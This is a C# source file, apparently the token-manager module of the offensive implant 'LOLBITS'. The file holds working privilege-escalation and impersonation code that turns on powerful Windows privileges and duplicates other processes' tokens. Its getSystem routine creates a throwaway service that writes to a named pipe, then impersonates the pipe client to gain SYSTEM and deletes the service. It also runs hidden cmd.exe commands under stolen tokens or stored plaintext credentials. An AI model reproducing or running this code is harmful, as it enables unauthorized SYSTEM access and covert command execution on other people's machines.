using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;

namespace LOLBITS
{
    public class TokenManager
    {
        public static IntPtr Token; 
        public static int Method; // 1 = CreateProcessAsUser ; 2 = CreateProcessWithToken ; Runas with valid credentials
        public static string[] creds = new string[3]; // user - domain ('.' for local) - password 
        private static string PipeName;
        private const int NumThreads = 1;


        public TokenManager()
        {
            Token = IntPtr.Zero;
            Method = 0;
        }

        public void Rev2Self()
        {
            Token = IntPtr.Zero;
            Method = 0;
        }

        public bool Impersonate (int pid)
        {
            IntPtr phandle = IntPtr.Zero;
            IntPtr ptoken = IntPtr.Zero;
            IntPtr imptoken = IntPtr.Zero;

            List<string> l = new List<string>();
            l.Add("SeDebugPrivilege");
            l.Add("SeImpersonatePrivilege");
            l.Add("SeTcbPrivilege");
            l.Add("SeAssignPrimaryTokenPrivilege");
            l.Add("SeIncreaseQuotaPrivilege");

            try
            {
                TokenUtils.enablePrivileges(Process.GetCurrentProcess().Handle, l);

                TokenUtils.getProcessHandle(pid, out phandle);

                TokenUtils.getProcessToken(phandle, TokenUtils.TokenAccessFlags.TOKEN_DUPLICATE, out ptoken);

                TokenUtils.CloseHandle(phandle);

                TokenUtils.TokenAccessFlags tokenAccess = TokenUtils.TokenAccessFlags.TOKEN_QUERY | TokenUtils.TokenAccessFlags.TOKEN_ASSIGN_PRIMARY |
                   TokenUtils.TokenAccessFlags.TOKEN_DUPLICATE | TokenUtils.TokenAccessFlags.TOKEN_ADJUST_DEFAULT |
                   TokenUtils.TokenAccessFlags.TOKEN_ADJUST_SESSIONID;

                TokenUtils.duplicateToken(ptoken, tokenAccess, TokenUtils.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TokenUtils.TOKEN_TYPE.TokenPrimary, out imptoken);

                TokenUtils.STARTUPINFO startupInfo = new TokenUtils.STARTUPINFO();
                startupInfo.cb = Marshal.SizeOf(startupInfo);
                startupInfo.lpDesktop = "";
                startupInfo.wShowWindow = 0;
                startupInfo.dwFlags |= 0x00000001;

                TokenUtils.PROCESS_INFORMATION processInfo = new TokenUtils.PROCESS_INFORMATION();


                if (Method == 0)
                    TokenUtils.determineImpersonationMethod(imptoken, new TokenUtils.LogonFlags(), startupInfo, out processInfo);

                if (Method != 0)
                {

                    Token = imptoken;
                    return true;
                }


            } catch {}

            return false;

        }

        public bool getSystem()
        {

            PipeName = Jobs.RandomString(7);
            bool exit = false;
            Thread server = new Thread(ServerThread);

            string cmd = "sc create NewDefaultService2 binpath= \"c:\\windows\\system32\\cmd.exe /C echo data > \\\\.\\pipe\\" + PipeName + "\"";
            TokenUtils.ExecuteCommand(cmd);

            server.Start();
            Thread.Sleep(250);

            cmd = "sc start NewDefaultService2";
            TokenUtils.ExecuteCommand(cmd);



            while (!exit)
            {

                if (server.Join(250))
                    exit = true;              
                
            }

            if (Token != IntPtr.Zero)           
                return true;          
            else
            {
                cmd = "sc delete NewDefaultService2";
                TokenUtils.ExecuteCommand(cmd);
            }

            return false;
        }

        private static void ServerThread(object data)
        {
            NamedPipeServerStream pipeServer = new NamedPipeServerStream(PipeName, PipeDirection.InOut, NumThreads);
            int threadId = Thread.CurrentThread.ManagedThreadId;


            // Wait for a client to connect
            pipeServer.WaitForConnection();

            try
            {
                // Read the request from the client. Once the client has
                // written to the pipe its security token will be available.

                StreamString ss = new StreamString(pipeServer);

                string filename = ss.ReadString();
                TokenUtils fileReader = new TokenUtils();

                pipeServer.RunAsClient(fileReader.Start);

                // Catch the IOException that is raised if the pipe is broken
                // or disconnected.
            }
            catch{}
            finally
            {
                pipeServer.Close();

            }

        }

        public bool Runas(string domain, string user, string password)
        {
            TokenUtils.Runas(domain, user, password);

            if (Method == 3)
                return true;

            return false;
        }
    }


    // Defines the data protocol for reading and writing strings on our stream
    public class StreamString
    {
        private Stream ioStream;
        private UnicodeEncoding streamEncoding;

        public StreamString(Stream ioStream)
        {
            this.ioStream = ioStream;
            streamEncoding = new UnicodeEncoding();
        }

        public string ReadString()
        {
            int len = 0;

            len = ioStream.ReadByte() * 256;
            len += ioStream.ReadByte();
            byte[] inBuffer = new byte[len];
            ioStream.Read(inBuffer, 0, len);

            return streamEncoding.GetString(inBuffer);
        }

        public int WriteString(string outString)
        {
            byte[] outBuffer = streamEncoding.GetBytes(outString);
            int len = outBuffer.Length;
            if (len > UInt16.MaxValue)
            {
                len = (int)UInt16.MaxValue;
            }
            ioStream.WriteByte((byte)(len / 256));
            ioStream.WriteByte((byte)(len & 255));
            ioStream.Write(outBuffer, 0, len);
            ioStream.Flush();

            return outBuffer.Length + 2;
        }
    }

    public class TokenUtils
    {
        public const UInt32 SE_PRIVILEGE_ENABLED = 0x00000002;

        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);


        [StructLayout(LayoutKind.Sequential)]
        public struct LUID_AND_ATTRIBUTES
        {
            public LUID Luid;
            public UInt32 Attributes;
        }
        const Int32 ANYSIZE_ARRAY = 1;

        public struct TOKEN_PRIVILEGES
        {
            public UInt32 PrivilegeCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = ANYSIZE_ARRAY)]
            public LUID_AND_ATTRIBUTES[] Privileges;
        }

       
        public enum LogonFlags
        {
            WithProfile = 1,
            NetCredentialsOnly
        };


        [Flags()]
        public enum TokenAccessFlags : int
        {
            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
            STANDARD_RIGHTS_READ = 0x00020000,
            TOKEN_ASSIGN_PRIMARY = 0x0001,
            TOKEN_DUPLICATE = 0x0002,
            TOKEN_IMPERSONATE = 0x0004,
            TOKEN_QUERY = 0x0008,
            TOKEN_QUERY_SOURCE = 0x0010,
            TOKEN_ADJUST_PRIVILEGES = 0x0020,
            TOKEN_ADJUST_GROUPS = 0x0040,
            TOKEN_ADJUST_DEFAULT = 0x0080,
            TOKEN_ADJUST_SESSIONID = 0x0100,
            TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY),
            TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
                TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
                TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
                TOKEN_ADJUST_SESSIONID)
        }

      
        public enum SECURITY_IMPERSONATION_LEVEL
        {
            SecurityAnonymous,
            SecurityIdentification,
            SecurityImpersonation,
            SecurityDelegation
        }

        public enum TOKEN_TYPE
        {
            TokenPrimary = 1,
            TokenImpersonation
        }

        [Flags]
        public enum CreationFlags
        {
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NEW_CONSOLE = 0x00000010,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_NO_WINDOW = 0x08000000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_SEPARATE_WOW_VDM = 0x00001000,
            CREATE_SUSPENDED = 0x00000004,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            DEBUG_PROCESS = 0x00000001,
            DETACHED_PROCESS = 0x00000008,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, [MarshalAs(UnmanagedType.Bool)]bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, Int32 Zero, IntPtr Null1, IntPtr Null2);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle, TokenAccessFlags DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern  bool DuplicateTokenEx(
            IntPtr hExistingToken,
            TokenAccessFlags dwDesiredAccess,
            IntPtr lpThreadAttributes,
            SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
            TOKEN_TYPE TokenType,
            out IntPtr phNewToken);

        [DllImport("kernel32.dll", EntryPoint = "CloseHandle", SetLastError = true, CharSet = CharSet.Auto,
            CallingConvention = CallingConvention.StdCall)]
        public extern static bool CloseHandle(IntPtr handle);

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool CreateProcessAsUserW(
            IntPtr hToken,
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            CreationFlags dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(
            IntPtr hToken,
            LogonFlags dwLogonFlags,
            string lpApplicationName,
            string lpCommandLine,
            CreationFlags dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreatePipe(ref IntPtr hReadPipe, ref IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, Int32 nSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToRead, ref int lpNumberOfBytesRead, IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithLogonW(
             String userName,
             String domain,
             String password,
             LogonFlags logonFlags,
             String applicationName,
             String commandLine,
             CreationFlags creationFlags,
             UInt32 environment,
             String currentDirectory,
             ref STARTUPINFO startupInfo,
             out PROCESS_INFORMATION processInformation);

        public static bool enablePrivileges(IntPtr handle, List<string> aPrivs)
        {
            LUID myLUID;

            foreach (string aPriv in aPrivs)
            {

                try
                {

                    if (LookupPrivilegeValue(null, aPriv, out myLUID))
                    {
                        TOKEN_PRIVILEGES myTokenPrivileges;

                        myTokenPrivileges.PrivilegeCount = 1;
                        myTokenPrivileges.Privileges = new LUID_AND_ATTRIBUTES[1];
                        myTokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                        myTokenPrivileges.Privileges[0].Luid = myLUID;

                        AdjustTokenPrivileges(handle, false, ref myTokenPrivileges, 0, IntPtr.Zero, IntPtr.Zero);
                    }

                }
                catch { return false; }

            }
            return true;

        }

        public static void getProcessHandle(int pid, out IntPtr token)
        {
            token = OpenProcess(ProcessAccessFlags.QueryInformation,false,pid);
        }

        public static void getProcessToken(IntPtr handle, TokenAccessFlags access, out IntPtr currentToken)
        {
            OpenProcessToken(Process.GetCurrentProcess().Handle, TokenAccessFlags.TOKEN_ADJUST_PRIVILEGES, out currentToken);
        }

        public static void duplicateToken(IntPtr token,TokenAccessFlags tokenAccess, SECURITY_IMPERSONATION_LEVEL se, TOKEN_TYPE type, out IntPtr duplicated)
        {
            if (!DuplicateTokenEx(token, tokenAccess, IntPtr.Zero, se, type, out duplicated))
            {
                duplicated = IntPtr.Zero;
            }
        }

        public static void determineImpersonationMethod(IntPtr token, LogonFlags l, STARTUPINFO startupInfo, out PROCESS_INFORMATION processInfo)

        { 
            if (CreateProcessAsUserW(token, @"c:\windows\system32\cmd.exe /Q /C echo hi && exit", null, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref startupInfo, out processInfo))
                TokenManager.Method = 1;
            else
            {
                if (CreateProcessWithTokenW(token, l, null, @"c:\windows\system32\cmd.exe /Q /C echo hi && exit", 0, IntPtr.Zero, null, ref startupInfo, out processInfo))
                    TokenManager.Method = 2;
                
            }
        }

        public void Start()
        {


            try
            {
                IntPtr token = WindowsIdentity.GetCurrent().Token;
                List<string> aPrivs = new List<string>();

                aPrivs.Add("SeImpersonatePrivilege");
                aPrivs.Add("SeTcbPrivilege");
                aPrivs.Add("SeAssignPrimaryTokenPrivilege");
                aPrivs.Add("SeIncreaseQuotaPrivilege");

                IntPtr currentToken;
              
                OpenProcessToken(Process.GetCurrentProcess().Handle, TokenAccessFlags.TOKEN_ADJUST_PRIVILEGES, out currentToken);

                enablePrivileges(currentToken, aPrivs);
                
                CloseHandle(currentToken);
                
                TokenAccessFlags tokenAccess = TokenAccessFlags.TOKEN_QUERY | TokenAccessFlags.TOKEN_ASSIGN_PRIMARY |
                TokenAccessFlags.TOKEN_DUPLICATE | TokenAccessFlags.TOKEN_ADJUST_DEFAULT |
                TokenAccessFlags.TOKEN_ADJUST_SESSIONID;
                
                IntPtr newToken = IntPtr.Zero;
                if (!DuplicateTokenEx(token, tokenAccess, IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, out newToken))
                {
                    return;

                }
                
                STARTUPINFO startupInfo = new STARTUPINFO();
                startupInfo.cb = Marshal.SizeOf(startupInfo);
                startupInfo.lpDesktop = "";
                startupInfo.wShowWindow = 0;
                startupInfo.dwFlags |= 0x00000001;

                PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
                LogonFlags l = new LogonFlags();

                if (CreateProcessAsUserW(newToken, @"c:\windows\system32\cmd.exe /Q /C sc delete NewDefaultService2 && exit", null, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref startupInfo, out processInfo))
                {
                    TokenManager.Token = newToken;
                    TokenManager.Method = 1;

                }
                else
                {
                    if (CreateProcessWithTokenW(newToken, l, null, @"c:\windows\system32\cmd.exe /Q /C sc delete NewDefaultService2 && exit", 0, IntPtr.Zero, null, ref startupInfo, out processInfo))
                    {
                        TokenManager.Token = newToken;
                        TokenManager.Method = 2;

                    }
                }

            }
            catch { }


        }

        public static string ExecuteCommand(string command)
        {
            string output = "";
            if (TokenManager.Token == IntPtr.Zero && TokenManager.Method == 0)
            {
                Process process = new Process();
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.FileName = @"C:\windows\system32\cmd.exe";
                startInfo.Arguments = "/C" + command + " && exit";
                startInfo.RedirectStandardOutput = true;
                startInfo.RedirectStandardError = true;
                startInfo.UseShellExecute = false;
                process.StartInfo = startInfo;
                process.Start();
                output = process.StandardOutput.ReadToEnd();
                if (output == "")
                    output = string.Concat("ERR:",process.StandardError.ReadToEnd());
                process.WaitForExit();
                process.Close();
            }
            else
            {

                IntPtr out_read = IntPtr.Zero;
                IntPtr out_write = IntPtr.Zero;

                SECURITY_ATTRIBUTES saAttr = new SECURITY_ATTRIBUTES();
                saAttr.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
                saAttr.bInheritHandle = true;
                saAttr.lpSecurityDescriptor = IntPtr.Zero;

                CreatePipe(ref out_read, ref out_write, ref saAttr, 0);

                STARTUPINFO startupInfo = new STARTUPINFO();
                startupInfo.cb = Marshal.SizeOf(startupInfo);
                startupInfo.lpDesktop = "";
                startupInfo.hStdOutput = out_write;
                startupInfo.hStdError = out_write;
                startupInfo.wShowWindow = 0;
                startupInfo.dwFlags |= 0x00000101;

                PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
                LogonFlags l = new LogonFlags();

                if (TokenManager.Method == 1)
                
                    CreateProcessAsUserW(TokenManager.Token, @"c:\windows\system32\cmd.exe /Q /C" + @command, null, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref startupInfo, out processInfo);
                
                else if (TokenManager.Method == 2)
                
                    CreateProcessWithTokenW(TokenManager.Token, l, null, @"c:\windows\system32\cmd.exe /Q /C" + @command, 0, IntPtr.Zero, null, ref startupInfo, out processInfo);
                
                else
                
                    CreateProcessWithLogonW(TokenManager.creds[0], TokenManager.creds[1], TokenManager.creds[2], l, null, @"c:\windows\system32\cmd.exe /Q /C" + command, 0, 0, null, ref startupInfo, out processInfo);
                

                byte[] buf = new byte[100];
                int dwRead = 0;
                Thread.Sleep(500);

                while (true)
                {
                    bool bSuccess = ReadFile(out_read, buf, 100, ref dwRead, IntPtr.Zero);
                    output = string.Concat(output, Encoding.Default.GetString(buf));

                    if (!bSuccess || dwRead < 100)
                        break;


                }

                CloseHandle(out_read);
                CloseHandle(out_write);
            }

            return output;
        }

        internal static void Runas(string domain, string user, string password)
        {
            STARTUPINFO startupInfo = new STARTUPINFO();
            startupInfo.cb = Marshal.SizeOf(startupInfo);
            startupInfo.lpDesktop = "";
            startupInfo.wShowWindow = 0;
            startupInfo.dwFlags |= 0x00000001;

            PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
            LogonFlags l = new LogonFlags();

            if (CreateProcessWithLogonW(user, domain, password, l, null, @"c:\windows\system32\cmd.exe /Q /C hostname", 0, 0, null, ref startupInfo, out processInfo))
            {
                TokenManager.Method = 3;
                TokenManager.creds[0] = user;
                TokenManager.creds[1] = domain;
                TokenManager.creds[2] = password;
            }
            
        }
    }


}
